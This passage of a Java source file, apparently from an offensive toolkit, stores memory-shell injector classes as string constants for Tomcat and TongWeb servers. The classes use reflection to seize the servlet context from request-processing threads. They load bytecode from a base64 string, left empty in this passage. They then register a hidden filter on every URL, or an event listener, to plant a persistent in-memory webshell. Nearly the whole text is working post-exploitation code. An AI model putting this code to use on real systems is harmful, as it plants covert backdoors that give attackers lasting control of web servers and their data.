                    "                                Object var9 = getFV(var7.get(var8), \"req\");\n" +
                    "                                RESPONSE = var9.getClass().getMethod(\"getResponse\", (Class[]) (new Class[0])).invoke(var9);\n" +
                    "\n" +
                    "                                Object var10 = var9.getClass().getDeclaredMethod(\"getNote\", Integer.TYPE).invoke(var9, 1);\n" +
                    "\n" +
                    "                                try {\n" +
                    "                                    Field var11 = var10.getClass().getDeclaredField(\"context\");\n" +
                    "                                    var11.setAccessible(true);\n" +
                    "                                    STANDARD_CONTEXT = var11.get(var10);\n" +
                    "                                } catch (Exception var16) {\n" +
                    "                                    Object var12 = var10.getClass().getDeclaredMethod(\"getServletContext\").invoke(var10);\n" +
                    "                                    Field var13 = var12.getClass().getDeclaredField(\"context\");\n" +
                    "                                    var13.setAccessible(true);\n" +
                    "                                    Object var14 = var13.get(var12);\n" +
                    "                                    Field var15 = var14.getClass().getDeclaredField(\"context\");\n" +
                    "                                    var15.setAccessible(true);\n" +
                    "                                    STANDARD_CONTEXT = var15.get(var14);\n" +
                    "                                }\n" +
                    "                                if (STANDARD_CONTEXT != null) {\n" +
                    "                                    var0 = true;\n" +
                    "                                    break;\n" +
                    "                                }\n" +
                    "\n" +
                    "                            }\n" +
                    "\n" +
                    "                            if (var0) {\n" +
                    "                                break;\n" +
                    "                            }\n" +
                    "                        }\n" +
                    "                    }\n" +
                    "                } catch (Exception e) {\n" +
                    "                }\n" +
                    "            }\n" +
                    "        }\n" +
                    "\n" +
                    "    }\n" +
                    "\n" +
                    "    public static void injectMemShellClass() {\n" +
                    "        try {\n" +
                    "            MEMSHELL_OBJECT = Thread.currentThread().getContextClassLoader().loadClass(ListenerName).newInstance();\n" +
                    "        } catch (Exception var5) {\n" +
                    "            try {\n" +
                    "                Method var1 = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, Integer.TYPE, Integer.TYPE);\n" +
                    "                var1.setAccessible(true);\n" +
                    "                byte[] var2 = base64Decode(\"\");\n" +
                    "                Class var3 = (Class) var1.invoke(Thread.currentThread().getContextClassLoader(), var2, 0, var2.length);\n" +
                    "                MEMSHELL_OBJECT = var3.newInstance();\n" +
                    "            } catch (Exception var4) {\n" +
                    "            }\n" +
                    "        }\n" +
                    "\n" +
                    "    }\n" +
                    "\n" +
                    "    public static byte[] base64Decode(String bs) throws Exception {\n" +
                    "        byte[] value = null;\n" +
                    "\n" +
                    "        Class base64;\n" +
                    "        try {\n" +
                    "            base64 = Class.forName(\"java.util.Base64\");\n" +
                    "            Object decoder = base64.getMethod(\"getDecoder\", (Class[]) null).invoke(base64, (Object[]) null);\n" +
                    "            value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
                    "        } catch (Exception var6) {\n" +
                    "            try {\n" +
                    "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
                    "                Object decoder = base64.newInstance();\n" +
                    "                value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
                    "            } catch (Exception var5) {\n" +
                    "            }\n" +
                    "        }\n" +
                    "\n" +
                    "        return value;\n" +
                    "    }\n" +
                    "\n" +
                    "    static {\n" +
                    "        new TomcatListenerMemShell();\n" +
                    "    }\n" +
                    "}\n";

    public static final String TomcatFilterMemShell =
            "import java.lang.reflect.Constructor;\n" +
            "import java.lang.reflect.Field;\n" +
            "import java.lang.reflect.Method;\n" +
            "import java.util.ArrayList;\n" +
            "import java.util.List;\n" +
            "import java.util.Map;\n" +
            "\n" +
            "public class TomcatFilterMemShell {\n" +
            "    public static Object STANDARD_CONTEXT;\n" +
            "    public static Object RESPONSE;\n" +
            "\n" +
            "    public TomcatFilterMemShell() {\n" +
            "        try {\n" +
            "            if (STANDARD_CONTEXT == null) {\n" +
            "                getStandardContext();\n" +
            "                getStandardContext1();\n" +
            "            }\n" +
            "            IMC();\n" +
            "            if (STANDARD_CONTEXT != null) {\n" +
            "                IMF();\n" +
            "            }\n" +
            "        } catch (Exception e) {\n" +
            "\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    private static synchronized void IMF() {\n" +
            "        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();\n" +
            "\n" +
            "        try {\n" +
            "            String filterName = \"memshell.TomcatFilterShell\";\n" +
            "            Object filter = (Object) Thread.currentThread().getContextClassLoader().loadClass(filterName).newInstance();\n" +
            "            Class<?> Context = null;\n" +
            "            try {\n" +
            "                Context = classLoader.loadClass(\"org.apache.catalina.Context\"); //\n" +
            "            } catch (Exception e) {\n" +
            "            }\n" +
            "            Class<?> FilterDefClass = null;\n" +
            "            try {\n" +
            "                FilterDefClass = classLoader.loadClass(\"org.apache.catalina.deploy.FilterDef\"); // 6 7\n" +
            "            } catch (Exception e) {\n" +
            "                FilterDefClass = classLoader.loadClass(\"org.apache.tomcat.util.descriptor.web.FilterDef\"); // 8 9\n" +
            "            }\n" +
            "            Constructor FilterDefCons = FilterDefClass.getDeclaredConstructor();\n" +
            "            FilterDefCons.setAccessible(true);\n" +
            "            Object filterDef = FilterDefCons.newInstance();\n" +
            "            invoke(filterDef, \"setFilterName\", filterName);\n" +
            "            invoke(filterDef, \"setFilterClass\", filter.getClass().getName());\n" +
            "            invoke(STANDARD_CONTEXT, \"addFilterDef\", filterDef);\n" +
            "\n" +
            "            Class<?> filterMapClass = null;\n" +
            "            try {\n" +
            "                filterMapClass = classLoader.loadClass(\"org.apache.catalina.deploy.FilterMap\"); // 6 7\n" +
            "            } catch (Exception e) {\n" +
            "                filterMapClass = classLoader.loadClass(\"org.apache.tomcat.util.descriptor.web.FilterMap\"); // 8 9\n" +
            "            }\n" +
            "            Constructor FilterMapCons = filterMapClass.getDeclaredConstructor();\n" +
            "            FilterMapCons.setAccessible(true);\n" +
            "            Object FilterMapObj = FilterMapCons.newInstance();\n" +
            "            invoke(FilterMapObj, \"addURLPattern\", \"/*\");\n" +
            "            invoke(FilterMapObj, \"setFilterName\", filterName);\n" +
            "            invoke(STANDARD_CONTEXT, \"addFilterMap\", FilterMapObj);\n" +
            "\n" +
            "            Class<?> ApplicationFilterConfigClass = classLoader.loadClass(\"org.apache.catalina.core.ApplicationFilterConfig\");\n" +
            "            Constructor ApplicationFilterCons = ApplicationFilterConfigClass.getDeclaredConstructor(Context, FilterDefClass);\n" +
            "            ApplicationFilterCons.setAccessible(true);\n" +
            "            Object ApplicationfilterObj = ApplicationFilterCons.newInstance(STANDARD_CONTEXT, filterDef);\n" +
            "\n" +
            "            // https://www.cnblogs.com/yyhuni/p/shiroMemshell.html#1%E4%BB%8Epost%E8%AF%B7%E6%B1%82%E4%BD%93%E4%B8%AD%E5%8F%91%E9%80%81%E5%AD%97%E8%8A%82%E7%A0%81%E6%95%B0%E6%8D%AE\n" +
            "            Field getAppFilterConfigs =null;\n" +
            "            try{\n" +
            "                getAppFilterConfigs = STANDARD_CONTEXT.getClass().getSuperclass().getDeclaredField(\"filterConfigs\");\n" +
            "            }catch (Exception e){\n" +
            "                getAppFilterConfigs = STANDARD_CONTEXT.getClass().getDeclaredField(\"filterConfigs\");\n" +
            "            }\n" +
            "\n" +
            "            getAppFilterConfigs.setAccessible(true);\n" +
            "            Map filterConfigs = (Map) getAppFilterConfigs.get(STANDARD_CONTEXT);\n" +
            "            filterConfigs.put(filterName, ApplicationfilterObj);\n" +
            "\n" +
            "        } catch (Throwable var16) {\n" +
            "\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    private static Method getMethodByClass(Class cs, String methodName, Class... parameters) {\n" +
            "        Method method = null;\n" +
            "\n" +
            "        while (cs != null) {\n" +
            "            try {\n" +
            "                method = cs.getDeclaredMethod(methodName, parameters);\n" +
            "                cs = null;\n" +
            "            } catch (Exception var6) {\n" +
            "                cs = cs.getSuperclass();\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return method;\n" +
            "    }\n" +
            "\n" +
            "    private static Object invoke(Object obj, String methodName, Object... parameters) {\n" +
            "        try {\n" +
            "            ArrayList classes = new ArrayList();\n" +
            "            if (parameters != null) {\n" +
            "                for (int i = 0; i < parameters.length; ++i) {\n" +
            "                    Object o1 = parameters[i];\n" +
            "                    if (o1 != null) {\n" +
            "                        classes.add(o1.getClass());\n" +
            "                    } else {\n" +
            "                        classes.add((Object) null);\n" +
            "                    }\n" +
            "                }\n" +
            "            }\n" +
            "\n" +
            "            Method method = getMethodByClass(obj.getClass(), methodName, (Class[]) ((Class[]) classes.toArray(new Class[0])));\n" +
            "            return method.invoke(obj, parameters);\n" +
            "        } catch (Exception var7) {\n" +
            "            return null;\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    private static synchronized Object getFV(Object var0, String var1) throws Exception {\n" +
            "        Field var2 = null;\n" +
            "        Class var3 = var0.getClass();\n" +
            "\n" +
            "        while (var3 != Object.class) {\n" +
            "            try {\n" +
            "                var2 = var3.getDeclaredField(var1);\n" +
            "                break;\n" +
            "            } catch (NoSuchFieldException var5) {\n" +
            "                var3 = var3.getSuperclass();\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        if (var2 == null) {\n" +
            "            throw new NoSuchFieldException(var1);\n" +
            "        } else {\n" +
            "            var2.setAccessible(true);\n" +
            "            return var2.get(var0);\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void getStandardContext() throws Exception {\n" +
            "        boolean var0 = false;\n" +
            "        Thread[] var1 = (Thread[]) ((Thread[]) getFV(Thread.currentThread().getThreadGroup(), \"threads\"));\n" +
            "\n" +
            "        for (int var2 = 0; var2 < var1.length; ++var2) {\n" +
            "            Thread var3 = var1[var2];\n" +
            "            if (var3 != null) {\n" +
            "                String var4 = var3.getName();\n" +
            "//                if (!var4.contains(\"exec\") && var4.contains(\"http\")) {\n" +
            "                try {\n" +
            "                    if (var4.startsWith(\"http\")) {\n" +
            "                        Object var5 = getFV(var3, \"target\");\n" +
            "                        if (var5 instanceof Runnable) {\n" +
            "                            Object var6;\n" +
            "                            try {\n" +
            "                                var6 = getFV(getFV(getFV(var5, \"this$0\"), \"handler\"), \"global\");\n" +
            "                            } catch (Exception var17) {\n" +
            "                                continue;\n" +
            "                            }\n" +
            "\n" +
            "                            List var7 = (List) getFV(var6, \"processors\");\n" +
            "\n" +
            "                            for (int var8 = 0; var8 < var7.size(); ++var8) {\n" +
            "                                Object var9 = getFV(var7.get(var8), \"req\");\n" +
            "                                RESPONSE = var9.getClass().getMethod(\"getResponse\", (Class[]) (new Class[0])).invoke(var9);\n" +
            "\n" +
            "                                Object var10 = var9.getClass().getDeclaredMethod(\"getNote\", Integer.TYPE).invoke(var9, 1);\n" +
            "\n" +
            "                                try {\n" +
            "                                    Field var11 = var10.getClass().getDeclaredField(\"context\");\n" +
            "                                    var11.setAccessible(true);\n" +
            "                                    STANDARD_CONTEXT = var11.get(var10);\n" +
            "                                } catch (Exception var16) {\n" +
            "                                    Object var12 = var10.getClass().getDeclaredMethod(\"getServletContext\").invoke(var10);\n" +
            "                                    Field var13 = var12.getClass().getDeclaredField(\"context\");\n" +
            "                                    var13.setAccessible(true);\n" +
            "                                    Object var14 = var13.get(var12);\n" +
            "                                    Field var15 = var14.getClass().getDeclaredField(\"context\");\n" +
            "                                    var15.setAccessible(true);\n" +
            "                                    STANDARD_CONTEXT = var15.get(var14);\n" +
            "                                }\n" +
            "                                if (STANDARD_CONTEXT != null) {\n" +
            "                                    var0 = true;\n" +
            "                                    break;\n" +
            "                                }\n" +
            "\n" +
            "                            }\n" +
            "\n" +
            "                            if (var0) {\n" +
            "                                break;\n" +
            "                            }\n" +
            "                        }\n" +
            "                    }\n" +
            "                } catch (Exception e) {\n" +
            "                }\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    private void getStandardContext1() {\n" +
            "        try {\n" +
            "            Object request = Class.forName(\"com.opensymphony.webwork.ServletActionContext\").getMethod(\"getRequest\").invoke(null);\n" +
            "            Object servletContext = invokeMethod(request, \"getServletContext\");\n" +
            "            STANDARD_CONTEXT =  getFV(getFV(servletContext,\"context\"), \"context\");\n" +
            "        } catch (Exception e) {\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    private Object invokeMethod(Object obj,String methodName,Object... parameters){\n" +
            "        try {\n" +
            "            ArrayList classes = new ArrayList();\n" +
            "            if (parameters!=null){\n" +
            "                for (int i=0;i<parameters.length;i++){\n" +
            "                    Object o1=parameters[i];\n" +
            "                    if (o1!=null){\n" +
            "                        classes.add(o1.getClass());\n" +
            "                    }else{\n" +
            "                        classes.add(null);\n" +
            "                    }\n" +
            "                }\n" +
            "            }\n" +
            "            Method method=getMethodByClass(obj.getClass(), methodName, (Class[])classes.toArray(new Class[]{}));\n" +
            "\n" +
            "            return method.invoke(obj, parameters);\n" +
            "        }catch (Exception e){\n" +
            "//        \te.printStackTrace();\n" +
            "        }\n" +
            "        return null;\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void IMC() {\n" +
            "        try {\n" +
            "            Thread.currentThread().getContextClassLoader().loadClass(\"memshell.TomcatFilterShell\");\n" +
            "        } catch (Exception var4) {\n" +
            "            try {\n" +
            "                Method var1 = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, Integer.TYPE, Integer.TYPE);\n" +
            "                var1.setAccessible(true);\n" +
            "                byte[] var2 = base64Decode(\"\");\n" +
            "                var1.invoke(Thread.currentThread().getContextClassLoader(), var2, 0, var2.length);\n" +
            "            } catch (Throwable var3) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        byte[] value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", (Class[]) null).invoke(base64, (Object[]) null);\n" +
            "            value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "    static {\n" +
            "        new TomcatFilterMemShell();\n" +
            "    }\n" +
            "}\n";

    public static final String TongWebFilterMemShell =
            "import javax.servlet.Filter;\n" +
            "import java.lang.reflect.Constructor;\n" +
            "import java.lang.reflect.Field;\n" +
            "import java.lang.reflect.Method;\n" +
            "import java.util.ArrayList;\n" +
            "import java.util.Iterator;\n" +
            "import java.util.Map;\n" +
            "import java.util.Set;\n" +
            "\n" +
            "public class TongWebFilterMemShell {\n" +
            "    public static Object STANDARD_CONTEXT;\n" +
            "    public static Object RESPONSE;\n" +
            "    public static Object MEMSHELL_OBJECT;\n" +
            "    static String FilterName = \"memshell.TongWebFilterShell\";\n" +
            "\n" +
            "    public TongWebFilterMemShell() {\n" +
            "        try {\n" +
            "            if (STANDARD_CONTEXT == null) {\n" +
            "                getStandardContext();\n" +
            "            }\n" +
            "            if (STANDARD_CONTEXT != null && !isInjected()) {\n" +
            "                injectMemShellClass();\n" +
            "                injectMemShell();\n" +
            "            }\n" +
            "\n" +
            "        } catch (Exception var2) {\n" +
            "            var2.printStackTrace();\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    private static synchronized boolean isInjected() {\n" +
            "        try {\n" +
            "            Map map = (Map) getFV(STANDARD_CONTEXT, \"filterDefs\");\n" +
            "            Set set = map.keySet();\n" +
            "            Iterator it = set.iterator();\n" +
            "            while (it.hasNext()){\n" +
            "                Object o = it.next();\n" +
            "                if (o.toString().contains(FilterName)){\n" +
            "                    return true;\n" +
            "                }\n" +
            "            }\n" +
            "\n" +
            "        } catch (Exception e) {\n" +
            "        }\n" +
            "        return false;\n" +
            "    }\n" +
            "\n" +
            "\n" +
            "    private static synchronized void injectMemShell() {\n" +
            "        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();\n" +
            "\n" +
            "        try {\n" +
            "            Class<?> Context = null;\n" +
            "            try {\n" +
            "                Context = classLoader.loadClass(\"com.tongweb.web.thor.Context\"); //\n" +
            "            } catch (Exception e) {\n" +
            "            }\n" +
            "\n" +
            "            Filter filter = (Filter) Thread.currentThread().getContextClassLoader().loadClass(FilterName).newInstance();\n" +
            "            Class<?> FilterDefClass = null;\n" +
            "            try {\n" +
            "                FilterDefClass = classLoader.loadClass(\"com.tongweb.web.thor.deploy.FilterDef\"); //\n" +
            "            } catch (Exception e) {\n" +
            "            }\n" +
            "            Constructor FilterDefCons = FilterDefClass.getDeclaredConstructor();\n" +
            "            FilterDefCons.setAccessible(true);\n" +
            "            Object filterDef = FilterDefCons.newInstance();\n" +
            "            invoke(filterDef, \"setFilterName\", FilterName);\n" +
            "            invoke(filterDef, \"setFilterClass\", filter.getClass().getName());\n" +
            "            invoke(STANDARD_CONTEXT, \"addFilterDef\", filterDef);\n" +
            "\n" +
            "            Class<?> filterMapClass = null;\n" +
            "            try {\n" +
            "                filterMapClass = classLoader.loadClass(\"com.tongweb.web.thor.deploy.FilterMap\"); //\n" +
            "            } catch (Exception e) {\n" +
            "\n" +
            "            }\n" +
            "            Constructor FilterMapCons = filterMapClass.getDeclaredConstructor();\n" +
            "            FilterMapCons.setAccessible(true);\n" +
            "            Object FilterMapObj = FilterMapCons.newInstance();\n" +
            "            invoke(FilterMapObj, \"addURLPattern\", \"/*\");\n" +
            "            invoke(FilterMapObj, \"setFilterName\", FilterName);\n" +
            "            invoke(STANDARD_CONTEXT, \"addFilterMap\", FilterMapObj);\n" +
            "\n" +
            "            Class<?> ApplicationFilterConfigClass = classLoader.loadClass(\"com.tongweb.web.thor.core.ApplicationFilterConfig\");\n" +
            "            Constructor ApplicationFilterCons = ApplicationFilterConfigClass.getDeclaredConstructor(Context, FilterDefClass);\n" +
            "            ApplicationFilterCons.setAccessible(true);\n" +
            "            Object ApplicationfilterObj = ApplicationFilterCons.newInstance(STANDARD_CONTEXT, filterDef);\n" +
            "            Map filterConfigs = (Map) getFV(STANDARD_CONTEXT, \"filterConfigs\");\n" +
            "            filterConfigs.put(FilterName, ApplicationfilterObj);\n" +
            "\n" +
            "        } catch (Throwable var16) {\n" +
            "\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    private static Method getMethodByClass(Class cs, String methodName, Class... parameters) {\n" +
            "        Method method = null;\n" +
            "\n" +
            "        while (cs != null) {\n" +
            "            try {\n" +
            "                method = cs.getDeclaredMethod(methodName, parameters);\n" +
            "                cs = null;\n" +
            "            } catch (Exception var6) {\n" +
            "                cs = cs.getSuperclass();\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return method;\n" +
            "    }\n" +
            "\n" +
            "    private static Object invoke(Object obj, String methodName, Object... parameters) {\n" +
            "        try {\n" +
            "            ArrayList classes = new ArrayList();\n" +
            "            if (parameters != null) {\n" +
            "                for (int i = 0; i < parameters.length; ++i) {\n" +
            "                    Object o1 = parameters[i];\n" +
            "                    if (o1 != null) {\n" +
            "                        classes.add(o1.getClass());\n" +
            "                    } else {\n" +
            "                        classes.add((Object) null);\n" +
            "                    }\n" +
            "                }\n" +
            "            }\n" +
            "\n" +
            "            Method method = getMethodByClass(obj.getClass(), methodName, (Class[]) ((Class[]) classes.toArray(new Class[0])));\n" +
            "            return method.invoke(obj, parameters);\n" +
            "        } catch (Exception var7) {\n" +
            "            return null;\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    private static synchronized Object getFV(Object var0, String var1) throws Exception {\n" +
            "        Field var2 = null;\n" +
            "        Class var3 = var0.getClass();\n" +
            "\n" +
            "        while (var3 != Object.class) {\n" +
            "            try {\n" +
            "                var2 = var3.getDeclaredField(var1);\n" +
            "                break;\n" +
            "            } catch (NoSuchFieldException var5) {\n" +
            "                var3 = var3.getSuperclass();\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        if (var2 == null) {\n" +
            "            throw new NoSuchFieldException(var1);\n" +
            "        } else {\n" +
            "            var2.setAccessible(true);\n" +
            "            return var2.get(var0);\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void getStandardContext() throws Exception {\n" +
            "        try {\n" +
            "            int flag = 0;\n" +
            "            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();\n" +
            "            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();\n" +
            "            Field f1 = threadGroup.getClass().getDeclaredField(\"threads\");\n" +
            "            f1.setAccessible(true);\n" +
            "            Thread[] threads = (Thread[]) f1.get(threadGroup);\n" +
            "\n" +
            "            for (Thread thread : threads) {\n" +
            "                try {\n" +
            "                    char[] chars = (char[]) getFV(thread, \"name\");\n" +
            "                    String name = new String(chars);\n" +
            "                    if (name.contains(\"http-nio\") && name.contains(\"Acceptor\")) {\n" +
            "                        Object target = getFV(thread, \"target\");\n" +
            "                        Object this0 = getFV(target, \"this$0\");\n" +
            "                        Object handler = getFV(this0, \"handler\");\n" +
            "                        Object global = getFV(handler, \"global\");\n" +
            "                        Object processors = getFV(global, \"processors\");\n" +
            "                        Field f7 = processors.getClass().getDeclaredField(\"size\");\n" +
            "                        f7.setAccessible(true);\n" +
            "                        if (!f7.get(processors).toString().equals(\"0\")) {\n" +
            "                            if (flag == 0) {\n" +
            "                                Object[] elementData = (Object[]) getFV(processors, \"elementData\");\n" +
            "                                Object RequestO = getFV(elementData[0], \"req\");\n" +
            "                                RESPONSE = RequestO.getClass().getMethod(\"getResponse\", (Class[]) (new Class[0])).invoke(RequestO);\n" +
            "                                Method m2 = RequestO.getClass().getDeclaredMethod(\"getNote\", Integer.TYPE);\n" +
            "                                m2.setAccessible(true);\n" +
            "                                Object v = m2.invoke(RequestO, 1);\n" +
            "                                try {\n" +
            "                                    STANDARD_CONTEXT = getFV(v, \"context\");\n" +
            "                                } catch (Exception e) {\n" +
            "                                    Method m3 = v.getClass().getSuperclass().getDeclaredMethod(\"getServletContext\");\n" +
            "                                    m3.setAccessible(true);\n" +
            "                                    Object AppContextFacade = m3.invoke(v);\n" +
            "                                    Object AppContext = getFV(AppContextFacade, \"context\");\n" +
            "                                    STANDARD_CONTEXT = getFV(AppContext, \"context\");\n" +
            "                                }\n" +
            "                                flag = 1;\n" +
            "                            }\n" +
            "                        }\n" +
            "                    }\n" +
            "                } catch (Exception e) {\n" +
            "                }\n" +
            "\n" +
            "            }\n" +
            "\n" +
            "        } catch (Exception e) {\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static void injectMemShellClass() {\n" +
            "        try {\n" +
            "            MEMSHELL_OBJECT = Thread.currentThread().getContextClassLoader().loadClass(FilterName).newInstance();\n" +
            "        } catch (Exception var5) {\n" +
            "            try {\n" +
            "                String TongListenerBase64 = \"\";\n" +
            "                byte[] ListenerClass = base64Decode(TongListenerBase64);\n" +
            "                Method defineClass1 = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
            "                defineClass1.setAccessible(true);\n" +
            "                Class listenerClass = (Class) defineClass1.invoke(Thread.currentThread().getContextClassLoader(), ListenerClass, 0, ListenerClass.length);\n" +
            "                MEMSHELL_OBJECT = listenerClass.newInstance();\n" +
            "            } catch (Exception var4) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        byte[] value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", (Class[]) null).invoke(base64, (Object[]) null);\n" +
            "            value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "    static {\n" +
            "        new TongWebFilterMemShell();\n" +
            "    }\n" +
            "}\n";

    public static final String TongWebListenerMemShell =
                "import java.lang.reflect.Field;\n" +
                "import java.lang.reflect.Method;\n" +
                "\n" +
                "public class TongWebListenerMemShell {\n" +
                "\n" +
                "    public static Object STANDARD_CONTEXT;\n" +
                "    public static Object RESPONSE;\n" +
                "    public static Object MEMSHELL_OBJECT;\n" +
                "    static String ListenerName = \"memshell.TongWebListenerShell\";\n" +
                "\n" +
                "    public TongWebListenerMemShell() {\n" +
                "        try {\n" +
                "            if (STANDARD_CONTEXT == null) {\n" +
                "                getStandardContext();\n" +
                "            }\n" +
                "            if (STANDARD_CONTEXT != null && ! isInjected()){\n" +
                "                injectMemShellClass();\n" +
                "                injectMemShell();\n" +
                "            }\n" +
                "\n" +
                "        } catch (Exception var2) {\n" +
                "            var2.printStackTrace();\n" +
                "        }\n" +
                "\n" +
                "    }\n" +
                "\n" +
                "    private static synchronized boolean isInjected(){\n" +
                "        try {\n" +
                "            Object[] o = (Object[]) getFV(STANDARD_CONTEXT, \"applicationEventListenersObjects\");\n" +
                "            for(int i = 0; i < o.length; i ++){\n" +
                "                Object var1 = o[i];\n" +
                "                if (var1 != null && var1.getClass().getName().contains(ListenerName)){\n" +
                "                    return true;\n" +
                "                }\n" +
                "            }\n" +
                "        } catch (Exception e) {\n" +
                "        }\n" +
                "        return false;\n" +
                "    }\n" +
                "\n" +
                "\n" +
                "    private static synchronized void injectMemShell() {\n" +
                "        try {\n" +
                "            Method m4 = STANDARD_CONTEXT.getClass().getSuperclass().getDeclaredMethod(\"addApplicationEventListener\", Object.class);\n" +
                "            m4.setAccessible(true);\n" +
                "            m4.invoke(STANDARD_CONTEXT, MEMSHELL_OBJECT);\n" +
                "        } catch (Exception e) {\n" +
                "        }\n" +
                "\n" +
                "    }\n" +
                "\n" +
                "    private static synchronized Object getFV(Object var0, String var1) throws Exception {\n" +
                "        Field var2 = null;\n" +
                "        Class var3 = var0.getClass();\n" +
                "\n" +
                "        while (var3 != Object.class) {\n" +
                "            try {\n" +
                "                var2 = var3.getDeclaredField(var1);\n" +
                "                break;\n" +
                "            } catch (NoSuchFieldException var5) {\n" +
                "                var3 = var3.getSuperclass();\n" +
                "            }\n" +
                "        }\n" +
                "\n" +
                "        if (var2 == null) {\n" +
                "            throw new NoSuchFieldException(var1);\n" +
                "        } else {\n" +
                "            var2.setAccessible(true);\n" +
                "            return var2.get(var0);\n" +
                "        }\n" +
                "    }\n" +
                "\n" +
                "    public static synchronized void getStandardContext() throws Exception {\n" +
                "        try {\n" +
                "            int flag = 0;\n" +
                "            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();\n" +
                "            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();\n" +
                "            Field f1 = threadGroup.getClass().getDeclaredField(\"threads\");\n" +
                "            f1.setAccessible(true);\n" +
                "            Thread[] threads = (Thread[]) f1.get(threadGroup);\n" +
                "\n" +
                "            for (Thread thread : threads) {\n" +
                "                try {\n" +
                "                    char[] chars = (char[]) getFV(thread, \"name\");\n" +
                "                    String name = new String(chars);\n" +
                "                    if (name.contains(\"http-nio\") && name.contains(\"Acceptor\")) {\n" +
                "                        Object target = getFV(thread, \"target\");\n" +
                "                        Object this0 = getFV(target, \"this$0\");\n" +
                "                        Object handler = getFV(this0, \"handler\");\n" +
                "                        Object global = getFV(handler, \"global\");\n" +
                "                        Object processors = getFV(global, \"processors\");\n" +
                "                        Field f7 = processors.getClass().getDeclaredField(\"size\");\n" +
                "                        f7.setAccessible(true);\n" +
                "                        if (!f7.get(processors).toString().equals(\"0\")) {\n" +
                "                            if (flag == 0) {\n" +
                "                                Object[] elementData = (Object[]) getFV(processors, \"elementData\");\n" +
                "                                Object RequestO = getFV(elementData[0], \"req\");\n" +
                "                                RESPONSE = RequestO.getClass().getMethod(\"getResponse\", (Class[]) (new Class[0])).invoke(RequestO);\n" +
                "                                Method m2 = RequestO.getClass().getDeclaredMethod(\"getNote\", Integer.TYPE);\n" +
                "                                m2.setAccessible(true);\n" +
                "                                Object v = m2.invoke(RequestO, 1);\n" +
                "                                try {\n" +
                "                                    STANDARD_CONTEXT = getFV(v, \"context\");\n" +
                "                                } catch (Exception e) {\n" +
                "                                    Method m3 = v.getClass().getSuperclass().getDeclaredMethod(\"getServletContext\");\n" +
                "                                    m3.setAccessible(true);\n" +
                "                                    Object AppContextFacade = m3.invoke(v);\n" +
                "                                    Object AppContext = getFV(AppContextFacade, \"context\");\n" +
                "                                    STANDARD_CONTEXT = getFV(AppContext, \"context\");\n" +
                "                                }\n" +
                "                                flag = 1;\n" +
                "                            }\n" +
                "                        }\n" +
                "                    }\n" +
                "                } catch (Exception e) {\n" +
                "                }\n" +
                "\n" +
                "            }\n" +
                "\n" +
                "        } catch (Exception e) {\n" +
                "        }\n" +
                "    }\n" +
                "\n" +
                "    public static void injectMemShellClass() {\n" +
                "        try {\n" +
                "            MEMSHELL_OBJECT = Thread.currentThread().getContextClassLoader().loadClass(ListenerName).newInstance();\n" +
                "        } catch (Exception var5) {\n" +
                "            try {\n" +
                "                String TongListenerBase64 = \"\";\n" +
                "                byte[] ListenerClass = base64Decode(TongListenerBase64);\n" +
